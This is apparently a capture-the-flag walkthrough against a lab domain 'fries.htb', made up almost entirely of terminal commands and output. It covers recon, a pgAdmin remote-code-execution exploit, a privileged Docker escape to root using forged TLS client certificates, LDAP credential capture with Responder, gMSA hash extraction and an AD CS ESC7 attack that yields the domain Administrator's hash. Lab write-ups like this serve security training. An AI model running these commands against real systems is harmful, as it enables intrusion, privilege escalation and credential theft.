
```
kali@kali 2025-11-28 18:45:40 ~> nmap -sC -sV 10.129.200.77                                                                                                                                                                  18:47:23 [22/22]
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 18:45 UTC
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.98% done; ETC: 18:46 (0:00:00 remaining)
Nmap scan report for 10.129.200.77         
Host is up (0.096s latency).                                                                                                                                                                                                                 
Not shown: 984 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION   
22/tcp   open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)        
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-29 01:46:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-29T01:47:26+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:                   
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)                                                                    
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-nextprotoneg:
|_  http/1.1                                                                                                          
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| tls-alpn:                                                                                                           
|_  http/1.1                           
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?                                                                                          
464/tcp  open  kpasswd5?                   
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
|_ssl-date: 2025-11-29T01:47:25+00:00; +7h00m02s from scanner time.
2179/tcp open  vmrdp?                                                                                                 
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-29T01:47:26+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:                      
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19                                                                               
|_Not valid after:  2105-11-18T05:39:19                                                                               
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-29T01:47:25+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-29T01:46:45
|_  start_date: N/A
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.89 seconds

```




```
kali@kali 2025-11-28 19:00:38 ~> ffuf -H "Host: FUZZ.fries.htb" -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt" -u http://fries.htb/ -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://fries.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

code                    [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 80ms]

```




```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a 
```


```
db-mgmt05.fries.htb
```



we can login now

```
http://db-mgmt05.fries.htb/browser/
```


![[fries-20251128220616049.webp]]





-- No SQL could be generated for the selected object.
Version
9.1
Application Mode
Server
Commit
1cbdb435df81b9e4150ea4ed5014b5a00048d8f7 2025-02-25
Python Version
3.12.9
Current User
d.cooper@fries.htb
Browser
Firefox 128.0




```
kali@kali 2025-11-28 19:15:44 ~/b/h/fries> python payload.py --target-url http://db-mgmt05.fries.htb --username d.cooper@fries.htb --password D4LE11maan!! --db-user root --db-pass PsqLR00tpaSS11 --db-name gitea --payload "__import__('os').system('touch /tmp/success')"
[+] pgAdmin4 version 9.1 is affected
[+] Successfully authenticated to pgAdmin
[+] Found valid server ID: 1
[+] Exploiting the target...
[+] Received expected 500 response: {"success":0,"errormsg":"Error: not enough values to unpack (expected 3, got 2)","info":"","result":null,"data":null}
```



```
/ $ / $ env

HOSTNAME=cb46692a4590
SHLVL=2
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
OLDPWD=/pgadmin4
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
CORRUPTED_DB_BACKUP_FILE=
PWD=/
PGAPPNAME=pgAdmin 4 - CONN:476984
PYTHONPATH=/pgadmin4

```


these crednetials log us in as admin


```
kali@kali 2025-11-28 20:40:17 ~> showmount -e 192.168.100.2
Export list for 192.168.100.2:
/srv/web.fries.htb *
```


```
kali@kali 2025-11-28 20:49:33 ~/b/h/fries> id
uid=1000(kali) gid=59605603(friesgrp) groups=59605603(friesgrp),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),125(lpadmin),133(wireshark),135(kaboxer),1000(kali)
kali@kali 2025-11-28 20:49:33 ~/b/h/fries> ls
certs/  shared/  webroot/
kali@kali 2025-11-28 20:49:35 ~/b/h/fries> cd certs/
kali@kali 2025-11-28 20:49:38 ~/b/h/f/certs> ls
ca-key.pem  ca.pem  server-cert.pem  server.csr  server-key.pem  server-openssl.cnf

```


```
kali@kali 2025-11-28 21:41:37 ~/b/h/f/certs> 
                                             openssl genrsa -out client-key.pem 4096

                                             openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"

                                             openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out client-cert.pem -days 365

Certificate request self-signature ok
subject=CN=root
kali@kali 2025-11-28 21:41:40 ~/b/h/f/certs> scp client-cert.pem svc@10.129.200.77:client-cert.pem
                                             scp ca-key.pem svc@10.129.200.77:ca-key.pem
                                             scp ca.pem         svc@10.129.200.77:ca.pem
                                             scp client.csr         svc@10.129.200.77:client.csr
											 scp client-key.pem svc@10.129.200.77:client-key.pem
```



```
svc@web:~$ docker --tlsverify --tlscacert=ca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=tcp://127.0.0.1:2376 run -it --privileged -v /:/host fries-web sh
# id
uid=0(root) gid=0(root) groups=0(root)

```



```
grep: scripts/web/app/__pycache__/models.cpython-311.pyc: binary file matches                                                                                                                                                                
scripts/web/app/models.py:        password=parsed_url.password,                                                                                                                                                                              
scripts/pwm/config/PwmConfiguration.xml:                This configuration file has been auto-generated by the PWM password self service application.                                                                                        
scripts/pwm/config/PwmConfiguration.xml:        <property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>                                                                                   
```


```
rockon!
```


```
root@0a4f09c651e5:~/scripts/pwm/config# grep -ir user                                                                                                                                                                                        
PwmConfiguration.xml:            <value>CN=Users,DC=fries,DC=htb</value>                                                                                                                                                                     
PwmConfiguration.xml:        <setting key="ldap.proxy.username" modifyTime="2025-06-01T02:07:43Z" profile="default" syntax="STRING" syntaxVersion="0">                                                                                       
PwmConfiguration.xml:            <label>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User</label>                                                                                                                             
PwmConfiguration.xml:            <value>CN=svc_infra,CN=Users,DC=fries,DC=htb</value>                                                                                                                                                        
```





`rockon!` logs in us here

```
https://pwm.fries.htb/pwm/private/config/editor
```



```
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.188]
    Responder IPv6             [dead:beef:2::10ba]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-X8ZLKO1PDHE]
    Responder Domain Name      [NBGP.LOCAL]
    Responder DCE-RPC Port     [47009]

[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.200.77
[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
```



```
kali@kali 2025-11-29 05:27:27 ~> nxc ldap fries.htb -u "svc_infra" -p "m6tneOMAh5p0wQ0d" --gmsa
LDAP        10.129.200.77   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.200.77   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
LDAP        10.129.200.77   389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.200.77   389    DC01             Account: gMSA_CA_prod$        NTLM: fc20b3d3ec179c5339ca59fbefc18f4a     PrincipalsAllowedToReadPassword: svc_infra

```



```
kali@kali 2025-11-29 05:32:06 ~> cat 20251129053007_Certipy.txt                                                                                                                                                                              
Certificate Authorities                                                                                                                                                                                                                      
  0                                                                                                                                                                                                                                          
    CA Name                             : fries-DC01-CA                                                               
    DNS Name                            : DC01.fries.htb                                                              
    Certificate Subject                 : CN=fries-DC01-CA, DC=fries, DC=htb                                          
    Certificate Serial Number           : 26117C1FFA5705AF443B7E82E8C639A9                                            
    Certificate Validity Start          : 2025-11-18 05:39:18+00:00                                                   
    Certificate Validity End            : 3024-05-19 14:11:46+00:00                                                                                                                                                                          
    Web Enrollment                                                                                                                                                                                                                           
      HTTP                                                                                                            
        Enabled                         : False                                                                                                                                                                                              
      HTTPS                                                                                                                                                                                                                                  
        Enabled                         : False                                                                       
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : FRIES.HTB\Administrators
      Access Rights
        ManageCa                        : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
        Enroll                          : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Users
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
        ManageCertificates              : FRIES.HTB\Domain Admins
                                          FRIES.HTB\Enterprise Admins
                                          FRIES.HTB\Administrators
    [+] User Enrollable Principals      : FRIES.HTB\gMSA_CA_prod
                                          FRIES.HTB\Domain Computers
                                          FRIES.HTB\Authenticated Users
                                          FRIES.HTB\Domain Users
    [+] User ACL Principals             : FRIES.HTB\gMSA_CA_prod
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```





```
kali@kali 2025-11-29 05:39:18 ~> certipy ca -u 'gMSA_CA_prod$'@'fries.htb' -hashes ':fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip "10.129.200.77" -ca 'fries-DC01-CA' -add-officer 'svc_infra' 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'svc_infra' on 'fries-DC01-CA'

```

```
kali@kali 2025-11-29 05:39:21 ~> certipy ca -u 'gMSA_CA_prod$'@'fries.htb' -hashes ':fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip "10.129.200.77" -ca 'fries-DC01-CA' -list-templates
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'fries-DC01-CA':
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    SubCA
    Administrator

```


```
kali@kali 2025-11-29 05:39:54 ~> certipy ca -u 'gMSA_CA_prod$'@'fries.htb' -hashes ':fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip "10.129.200.77" -ca 'fries-DC01-CA'  -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)





[*] Successfully enabled 'SubCA' on 'fries-DC01-CA'
```



```
certutil -getreg Policy\EditFlags

$certAdmin = New-Object -ComObject CertificateAuthority.Admin
$config = "DC01.fries.htb\fries-DC01-CA"
$path = "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
$name = "EditFlags"
$value = 1376590 

# This method writes directly to the registry config via the CA Service
$certAdmin.SetConfigEntry($config, $path, $name, $value)

certutil -getreg Policy\EditFlags

Restart-Service CertSvc


```



```
$certAdmin = New-Object -ComObject CertificateAuthority.Admin
$config = "DC01.fries.htb\fries-DC01-CA"
$path   = "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy"
$name   = "DisableExtensionList"
$value  = "1.3.6.1.4.1.311.25.2"

$certAdmin.SetConfigEntry($config, $path, $name, $value)

```


```
kali@kali 2025-11-29 06:18:38 ~> certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.200.77'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@fries.htb'
[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Using principal: 'administrator@fries.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748

```









